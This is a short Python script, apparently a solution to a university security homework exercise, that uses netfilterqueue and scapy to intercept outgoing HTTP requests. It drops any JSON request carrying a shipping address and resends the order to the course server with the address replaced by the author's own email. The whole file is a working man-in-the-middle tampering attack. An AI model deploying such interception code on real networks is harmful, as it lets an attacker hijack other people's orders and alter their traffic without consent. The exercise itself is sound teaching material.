from netfilterqueue import NetfilterQueue
from scapy.all import *

import requests
import json


def process(pkt):
	drop = False
	ip = IP(pkt.get_payload())
	if ip[TCP].dport == 80:
		try:
			http = ip[Raw].load.decode()
			lines = http.split("\n")
			data = json.loads(lines[-1])
			if "shipping_address" in data:
				headers = {
    				'User-Agent': 'Dumb Generator',
				}
				new_data = {
					"shipping_address": "pau.argelaguet@epfl.ch",
					"product": data["product"]
				}
				drop = True
				r = requests.post("http://com402.epfl.ch/hw1/ex3/shipping", json=new_data, headers=headers)
				print(r.text)
		except IndexError:
			# No application layer
			pass
	if drop:
		pkt.drop()
	else:
		pkt.accept()


def main():
	nfqueue = NetfilterQueue()
	nfqueue.bind(0, process, 100)
	try:
		nfqueue.run()
	except KeyboardInterrupt:
		print('')


if __name__ == '__main__':
	main()
